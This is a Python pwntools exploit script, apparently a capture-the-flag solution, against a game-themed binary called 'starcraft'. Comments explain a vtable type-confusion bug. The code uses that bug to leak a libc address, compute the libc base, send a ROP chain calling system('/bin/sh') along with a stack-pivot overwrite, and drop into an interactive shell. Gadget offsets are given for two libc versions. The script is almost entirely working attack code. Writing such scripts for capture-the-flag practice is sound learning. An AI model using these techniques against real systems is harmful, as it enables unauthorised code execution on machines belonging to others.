from pwn import *

elf = ELF("./starcraft", checksec=False)
libc = ELF("./libc-2.23.so")

#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
#io = process("./starcraft")
io = remote("0.0.0.0",9020)

# Select Templar
io.sendlineafter(b"9. Ultralisk\n",b"6")

# Transform Templar into Arcon
io.sendlineafter(b"strom)",b"1")

## Type confusion
## On purpose, the program uses a vtable pointer at the end of the Templar instance to differentiate it from the Arcon
## The problem is that it keeps using the normal Templar vtable to select the attack and uses the other vtable pointer to jump to the correspinding function
## Calling templar_vtable->select_attack allow us to run Arcon vtable out of bounds
## Running Arcon functions out of bounds leads to running functions from the Hydralisk vtable (or maybe another Zerg class, idk)

# Calling hydralisk_vtable->zerg_info
io.sendlineafter(b"default)",b"2")

# Leaking exit@libc address
io.recvuntil(b"is burrowed : ")
low_bytes = int(io.recvline().strip())  & 0xffffffff
io.recvuntil(b"is burrow-able? : ")
high_bytes = int(io.recvline().strip())

# Calculate libc base address
libc_exit = (high_bytes << 32) | low_bytes

libc.address = libc_exit - libc.sym['exit']

one_gadget = libc.address + 0xddf43

io.info("glibc base address: " + hex(libc.address))
io.info("one gadget address: " + hex(one_gadget))

# LIBC 2.23.SO
# 0x00000000000353ba : add rsp, 0x148 ; ret
# 0x0000000000021112 : pop rdi ; ret

# LIBC 2.41.SO
# 0x00000000000bb6a3 : add rsp, 0x110 ; pop rbx ; ret
# 0x000000000002a145 : pop rdi ; ret

while True:
     sleep(0.1)
     data = io.recv(1024)
     if b"wanna cheat...?" in data:
        print("try again.")
        break
     if b"wanna cheat?" in data:
        # Calling cheat_codes
        # Prepare ROPchain
        io.sendline(b"yes")
        sleep(0.1)

        # local
        # pop_rdi_ret = libc.address +  0x000000000002a145 
        #io.sendline(cyclic(32) + p64(pop_rdi_ret) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(libc.sym['system']))

        # remote
        pop_rdi_ret = libc.address +  0x0000000000021112
        io.sendline(cyclic(80) + p64(pop_rdi_ret) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(libc.sym['system']))
        sleep(0.2)

        # Calling hydralisk_vtable->ascii_artwork
        # Overwrite exit@libc with a gadget
        io.sendline(b"1")
        sleep(0.1)

        # local
        #add_rsp_hex_110 = libc.address + 0x00000000000bb6a3
        # remote
        add_rsp_hex_114 = libc.address + 0x00000000000353ba
        io.sendline(b"A"*264 + p64(add_rsp_hex_114))
        sleep(0.2)

        # win
        io.sendline(b"w")
        io.recv(2048)
        sleep(0.2)
        io.interactive()
        break

     io.sendline(b"0")
